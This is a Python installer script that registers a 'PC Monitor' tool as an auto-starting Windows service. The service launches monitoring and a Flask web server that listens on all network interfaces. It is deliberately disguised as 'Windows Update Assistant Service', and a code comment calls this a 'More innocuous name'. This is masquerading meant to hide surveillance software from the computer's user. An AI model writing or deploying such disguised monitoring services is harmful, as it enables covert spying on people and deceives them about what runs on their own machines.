"""
Windows Service Installer for PC Monitor
Run this script with administrator privileges to install/uninstall the monitoring service

Usage:
    PCMonitor.exe install    - Install as Windows Service
    PCMonitor.exe remove     - Remove the service
    PCMonitor.exe start      - Start the service
    PCMonitor.exe stop       - Stop the service
    PCMonitor.exe restart    - Restart the service
"""

import sys
import os
import time
import win32serviceutil
import win32service
import win32event
import servicemanager
import socket
from pathlib import Path

# Import your server
import server

class PCMonitorService(win32serviceutil.ServiceFramework):
    _svc_name_ = "WindowsUpdateAssistant"  # More innocuous name
    _svc_display_name_ = "Windows Update Assistant Service"
    _svc_description_ = "Provides support for Windows Update operations"
    
    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.stop_event = win32event.CreateEvent(None, 0, 0, None)
        self.running = True
        socket.setdefaulttimeout(60)
    
    def SvcStop(self):
        """Called when service is stopped"""
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.stop_event)
        self.running = False
        
        # Stop monitoring
        if hasattr(server, 'monitoring') and server.monitoring:
            server.stop_monitoring()
        
        servicemanager.LogMsg(
            servicemanager.EVENTLOG_INFORMATION_TYPE,
            servicemanager.PYS_SERVICE_STOPPED,
            (self._svc_name_, '')
        )
    
    def SvcDoRun(self):
        """Called when service starts"""
        servicemanager.LogMsg(
            servicemanager.EVENTLOG_INFORMATION_TYPE,
            servicemanager.PYS_SERVICE_STARTED,
            (self._svc_name_, '')
        )
        
        self.main()
    
    def main(self):
        """Main service loop"""
        try:
            # Start monitoring automatically if configured
            if server.config.get('auto_start', True):
                server.start_monitoring()
            
            # Start Flask server in a thread
            from threading import Thread
            
            def run_flask():
                server.app.run(
                    host=server.config.get('host', '0.0.0.0'),
                    port=server.config.get('port', 5000),
                    debug=False,
                    use_reloader=False,
                    threaded=True
                )
            
            flask_thread = Thread(target=run_flask, daemon=True)
            flask_thread.start()
            
            # Keep service running
            while self.running:
                # Wait for stop event (timeout every 5 seconds to check)
                rc = win32event.WaitForSingleObject(self.stop_event, 5000)
                if rc == win32event.WAIT_OBJECT_0:
                    # Stop event was triggered
                    break
                
        except Exception as e:
            servicemanager.LogErrorMsg(f"Service error: {e}")
            self.SvcStop()


def install_service():
    """Install the service"""
    try:
        print("Installing PC Monitor Service...")
        
        # Install the service
        win32serviceutil.InstallService(
            PCMonitorService.__name__,
            PCMonitorService._svc_name_,
            PCMonitorService._svc_display_name_,
            startType=win32service.SERVICE_AUTO_START,
            description=PCMonitorService._svc_description_
        )
        
        print(f"✓ Service '{PCMonitorService._svc_display_name_}' installed successfully!")
        print(f"  Name: {PCMonitorService._svc_name_}")
        print(f"  Startup: Automatic")
        print(f"\nTo start the service, run:")
        print(f"  PCMonitor.exe start")
        print(f"\nOr use Windows Services Manager (services.msc)")
        
        return True
        
    except Exception as e:
        print(f"✗ Failed to install service: {e}")
        print("\nMake sure you're running as Administrator!")
        return False


def remove_service():
    """Remove the service"""
    try:
        print("Removing PC Monitor Service...")
        
        # Stop the service first if running
        try:
            win32serviceutil.StopService(PCMonitorService._svc_name_)
            print("  Stopping service...")
            time.sleep(2)
        except:
            pass
        
        # Remove the service
        win32serviceutil.RemoveService(PCMonitorService._svc_name_)
        
        print(f"✓ Service '{PCMonitorService._svc_display_name_}' removed successfully!")
        return True
        
    except Exception as e:
        print(f"✗ Failed to remove service: {e}")
        return False


def start_service():
    """Start the service"""
    try:
        print("Starting PC Monitor Service...")
        win32serviceutil.StartService(PCMonitorService._svc_name_)
        print(f"✓ Service started successfully!")
        print(f"\nService is now running in the background.")
        return True
        
    except Exception as e:
        print(f"✗ Failed to start service: {e}")
        return False


def stop_service():
    """Stop the service"""
    try:
        print("Stopping PC Monitor Service...")
        win32serviceutil.StopService(PCMonitorService._svc_name_)
        print(f"✓ Service stopped successfully!")
        return True
        
    except Exception as e:
        print(f"✗ Failed to stop service: {e}")
        return False


def restart_service():
    """Restart the service"""
    try:
        print("Restarting PC Monitor Service...")
        win32serviceutil.RestartService(PCMonitorService._svc_name_)
        print(f"✓ Service restarted successfully!")
        return True
        
    except Exception as e:
        print(f"✗ Failed to restart service: {e}")
        return False


def service_status():
    """Check service status"""
    try:
        status = win32serviceutil.QueryServiceStatus(PCMonitorService._svc_name_)
        status_map = {
            win32service.SERVICE_STOPPED: "STOPPED",
            win32service.SERVICE_START_PENDING: "STARTING",
            win32service.SERVICE_STOP_PENDING: "STOPPING",
            win32service.SERVICE_RUNNING: "RUNNING",
            win32service.SERVICE_CONTINUE_PENDING: "CONTINUING",
            win32service.SERVICE_PAUSE_PENDING: "PAUSING",
            win32service.SERVICE_PAUSED: "PAUSED"
        }
        
        status_text = status_map.get(status[1], "UNKNOWN")
        print(f"Service Status: {status_text}")
        
        if status[1] == win32service.SERVICE_RUNNING:
            print("✓ Service is running")
        else:
            print("✗ Service is not running")
        
        return True
        
    except Exception as e:
        print(f"✗ Service is not installed or error occurred: {e}")
        return False


def check_admin():
    """Check if running as administrator"""
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False


def print_usage():
    """Print usage instructions"""
    print("\n" + "="*70)
    print("PC Monitor Service Installer")
    print("="*70)
    print("\nUsage:")
    print("  PCMonitor.exe install    - Install as Windows Service")
    print("  PCMonitor.exe remove     - Remove the service")
    print("  PCMonitor.exe start      - Start the service")
    print("  PCMonitor.exe stop       - Stop the service")
    print("  PCMonitor.exe restart    - Restart the service")
    print("  PCMonitor.exe status     - Check service status")
    print("\nNote: Must be run as Administrator!")
    print("="*70 + "\n")


def handle_service_command(command):
    """Handle service commands from server.py"""
    # Check for admin privileges (except for status check)
    if command != 'status' and not check_admin():
        print("\n✗ ERROR: This script must be run as Administrator!")
        print("\nRight-click Command Prompt or PowerShell and select 'Run as Administrator'")
        print("Then run this script again.\n")
        sys.exit(1)
        
    if command == 'install':
        install_service()
    elif command == 'remove' or command == 'uninstall':
        remove_service()
    elif command == 'start':
        start_service()
    elif command == 'stop':
        stop_service()
    elif command == 'restart':
        restart_service()
    elif command == 'status':
        service_status()
    else:
        print(f"Unknown command: {command}")
        print_usage()
        sys.exit(1)


if __name__ == '__main__':
    # Check if pywin32 is installed
    try:
        import win32serviceutil
    except ImportError:
        print("Error: pywin32 is not installed!")
        print("Install it with: pip install pywin32")
        sys.exit(1)
    
    # Check arguments
    if len(sys.argv) < 2:
        print_usage()
        sys.exit(1)
    
    command = sys.argv[1].lower()
    
    # Handle the command
    handle_service_command(command)